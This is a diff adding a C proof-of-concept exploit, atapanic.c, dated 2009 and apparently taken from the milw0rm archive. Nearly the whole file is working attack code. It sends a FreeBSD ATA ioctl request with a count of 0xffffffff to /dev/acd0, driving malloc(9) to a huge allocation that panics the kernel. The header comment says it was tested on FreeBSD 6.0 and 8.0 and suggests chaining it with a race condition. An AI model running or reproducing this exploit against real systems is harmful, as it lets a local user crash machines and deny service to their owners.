@@ -1,0 +1,58 @@
+/* atapanic.c
+ *
+ * by Shaun Colley, 13 July 2009
+ *
+ * this panics the freebsd kernel by passing a large value to malloc(9) in one of
+ * fbsd's ata ioctl's.  tested on freebsd 6.0 and 8.0.  you need read access to the
+ * ata device in /dev to be able to open() the device.  chain with some race condition
+ * bug?
+ *
+ * - shaun
+ *
+ */
+
+
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+struct ata_ioc_requestz {
+    union {
+	struct {
+	    u_int8_t            command;
+	    u_int8_t            feature;
+	    u_int64_t           lba;
+	    u_int16_t           count;
+	} ata;
+	struct {
+	    char                ccb[16];
+	} atapi;
+    } u;
+
+    caddr_t             data;
+    int                 count;
+    int                 flags;
+
+    int                 timeout;
+    int                 error;
+};
+
+
+#define IOCATAREQUEST           _IOWR('a', 100, struct ata_ioc_requestz)
+
+int main() {
+
+struct ata_ioc_requestz evil;
+int fd;
+
+evil.count = 0xffffffff;
+fd = open("/dev/acd0", O_RDONLY);  /* /dev/acd0 is one of my ata devices */
+
+ioctl(fd, IOCATAREQUEST, &evil);
+
+/* should never reach here if kernel panics */
+return 0;    
+}
+
+// milw0rm.com [2009-07-13]
